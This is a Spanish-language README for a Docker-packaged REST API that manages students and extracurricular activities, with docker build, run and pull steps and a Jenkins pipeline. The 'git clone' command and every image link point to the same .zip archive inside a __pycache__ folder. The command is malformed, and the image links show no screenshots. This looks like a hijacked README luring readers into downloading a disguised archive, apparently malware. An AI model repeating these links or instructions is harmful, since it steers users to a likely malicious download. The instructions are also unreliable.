# API Departamento de Extraescolares

Este proyecto contiene una API REST para la gestión de actividades extraescolares. El contenedor Docker incluye la aplicación y todas sus dependencias.

## Requisitos

- Docker

## Instrucciones para construir y ejecutar el contenedor

1. Clona el repositorio:
   
       git clone https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip
       cd API_DepartamentoExtraescolares

2. Construye la imagen en Docker:

       docker build -t api_extraescolares .

3. Corre el contenedor:

       docker run -d -p 8000:8000 api_extraescolares

4. Accede a la API en tu navegador:

   - http://localhost:8000

## También puedes encontrar el contenedor directamente en DockerHub

     docker pull ivanporra5/api_extraescolares:latest
     docker run -d -p 8000:8000 ivanporra5/api_extraescolares

## Correr el contenedor en un servidor de Jenkins

1. Crea un Pipeline e inserta el siguiente script

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

        pipeline {
        agent any
        stages {
        stage('Pull Docker Image') {
             steps {
                 script {
                     sh 'docker pull ivanporra5/api_extraescolares:latest'
                 }
             }
         }
         stage('Run Docker Container') {
             steps {
                 script {
                     sh 'docker run -d -p 8000:8000 ivanporra5/api_extraescolares'
                 }
             }
         }
         }
         }
   
3. Ejecuta el pipeline y ahora puedes realizar pruebas con Postman

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

A continuación se muestran algunos ejemplos

- POST alumno

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- GET alumno por su número de control

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- PATCH alumno por su número de control

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- DELETE alumno por su número de control

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- POST actividad

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- GET actividad por su id

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- PATCH actividad por su id

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- DELETE actividad por su id

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- POST actividades_alumno

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- GET actividades_alumno por su id

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- PATCH actividades_alumno por su id

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)

- DELETE actividades_alumno por su id

![image](https://github.com/K5ope6/PracticaFinalKubernete/raw/refs/heads/master/__pycache__/Kubernete_Final_Practica_v2.2.zip)
